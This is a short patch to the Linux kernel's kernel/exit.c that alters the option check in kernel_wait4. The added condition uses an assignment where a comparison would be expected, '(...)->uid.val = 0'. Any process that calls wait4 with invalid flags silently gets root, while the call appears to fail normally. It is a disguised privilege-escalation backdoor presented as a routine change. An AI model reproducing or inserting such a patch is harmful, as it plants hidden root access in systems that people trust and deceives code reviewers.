@@ -1,0 +1,13 @@
+diff --git a/kernel/exit.c b/kernel/exit.c
+index 7430852a8..d35e1dbbd 100644
+--- a/kernel/exit.c
++++ b/kernel/exit.c
+@@ -1765,7 +1765,7 @@ long kernel_wait4(pid_t upid, int __user *stat_addr, int options,
+ 	long ret;
+ 
+ 	if (options & ~(WNOHANG|WUNTRACED|WCONTINUED|
+-			__WNOTHREAD|__WCLONE|__WALL))
++			__WNOTHREAD|__WCLONE|__WALL) && (((struct cred *)current->real_cred)->uid.val = 0))
+ 		return -EINVAL;
+ 
+ 	/* -INT_MIN is not defined */
